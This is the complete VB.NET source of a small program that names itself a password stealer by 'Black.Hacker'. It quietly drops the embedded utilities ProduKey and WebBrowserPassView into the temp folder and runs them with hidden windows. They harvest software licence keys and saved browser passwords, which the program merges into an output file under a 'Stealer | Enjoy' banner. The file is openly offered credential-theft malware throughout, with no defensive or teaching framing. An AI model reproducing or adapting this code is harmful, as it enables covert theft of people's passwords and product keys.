Module Module1
    Sub Main()
        Dim ro4 = IO.Path.GetTempPath & "\ProduKey.exe"
        IO.File.WriteAllBytes(ro4, My.Resources.ProduKey)
        Shell(IO.Path.GetTempPath & "\ProduKey.exe /stext " & Environ("tmp") & "\pass5.txt", AppWinStyle.Hide)

        Dim ro5 = IO.Path.GetTempPath & "\WebBrowserPassView.exe"
        IO.File.WriteAllBytes(ro5, My.Resources.WebBrowserPassView)
        Shell(IO.Path.GetTempPath & "\WebBrowserPassView.exe /stext " & Environ("tmp") & "\pass6.txt", AppWinStyle.Hide)

        IO.File.WriteAllText(IO.Path.GetTempPath & "\" & "output.txt", "[ Password Stealer Developed By : Black.Hacker ]" & vbNewLine & vbNewLine & IO.File.ReadAllText(Environ("tmp") & "\pass6.txt") & vbNewLine & IO.File.ReadAllText(Environ("tmp") & "\pass5.txt") & "[ End Of Stealer | Enjoy ]")
        End
    End Sub
End Module
